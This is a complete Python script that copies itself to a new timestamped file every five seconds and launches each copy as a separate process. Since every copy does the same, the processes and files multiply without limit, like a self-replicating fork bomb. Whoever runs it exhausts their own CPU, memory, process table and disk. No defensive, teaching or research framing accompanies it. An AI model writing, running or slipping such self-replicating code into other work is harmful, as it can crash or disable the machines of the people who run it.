import time
import shutil
import os
import subprocess

# Get the current script's filename
script_name = os.path.basename(__file__)

def duplicate_script(script_path):
    while True:
        # Create a unique timestamp for each copy
        timestamp = time.strftime("%Y%m%d%H%M%S")
        new_script_name = f"{script_path.split('.')[0]}_copy_{timestamp}.py"

        # Ensure that the filename is not too long (max length of filename is typically 255 characters)
        if len(new_script_name) > 255:
            new_script_name = new_script_name[:255]

        # Prevent duplicating the script that's already running (avoid SameFileError)
        if os.path.abspath(script_path) == os.path.abspath(new_script_name):
            print(f"Skipping duplicate of the same file: {new_script_name}")
            continue

        # Copy the script to a new file with a unique name
        shutil.copy(script_path, new_script_name)
        print(f"Duplicated script: {new_script_name}")

        # Run the new copy as a separate process
        subprocess.Popen(['python', new_script_name])

        # Wait for 5 seconds before duplicating again
        time.sleep(5)

if __name__ == "__main__":
    # Start duplicating from the script that was run
    duplicate_script(script_name)
